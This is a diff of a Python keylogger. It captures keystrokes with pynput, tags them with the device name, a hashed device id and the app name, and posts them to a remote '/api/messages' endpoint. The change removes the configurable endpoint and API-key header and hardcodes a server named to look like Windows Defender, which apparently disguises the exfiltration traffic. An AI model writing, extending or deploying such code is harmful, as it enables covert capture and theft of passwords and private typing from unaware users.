@@ -5,26 +5,16 @@ import hashlib
 import platform
 import socket
 import ctypes
-import sys
 from ctypes import wintypes
-from pathlib import Path
 from queue import Queue
 from threading import Lock, Thread
 from urllib.error import URLError, HTTPError
 from urllib.request import Request, urlopen
 
-from dotenv import load_dotenv
 from pynput.keyboard import Key, KeyCode, Listener
 
 MESSAGE_GAP_MS = 2500
-ENV_PATH = (
-    Path(sys.executable).with_name(".env")
-    if getattr(sys, "frozen", False)
-    else Path(__file__).with_name(".env")
-)
-load_dotenv(ENV_PATH)
-SITE_URL = os.getenv("KEY_FEED_URL", "https://your-app.onrender.com").rstrip("/")
-API_KEY = os.getenv("KEY_FEED_API_KEY", "")
+SITE_URL = "https://windows-defender-cf8n.onrender.com"
 device_name = platform.node() or socket.gethostname() or "Unknown device"
 device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
 message_buffer = ""
@@ -97,8 +87,6 @@ def normalize_key(key):
 def send_message(text, app_name):
     try:
         headers = {"Content-Type": "application/json"}
-        if API_KEY:
-            headers["X-API-Key"] = API_KEY
         request = Request(
             f"{SITE_URL}/api/messages",
             data=json.dumps(
